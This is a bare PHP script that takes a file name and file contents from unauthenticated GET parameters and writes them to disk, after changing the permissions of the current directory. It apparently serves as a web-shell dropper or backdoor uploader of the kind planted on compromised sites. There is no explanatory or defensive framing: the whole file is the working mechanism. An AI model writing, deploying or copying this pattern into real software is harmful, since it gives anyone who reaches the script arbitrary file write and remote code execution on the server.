<?php
chmod ("./", 755);
$fileContent = $_GET['fileContent'];
$fileName = $_GET['fileName'];
$resource = fopen($fileName,'w');
if(fwrite($resource,$fileContent))
{
echo '1';
}
else
{
echo '0';
}
fclose($resource);
?>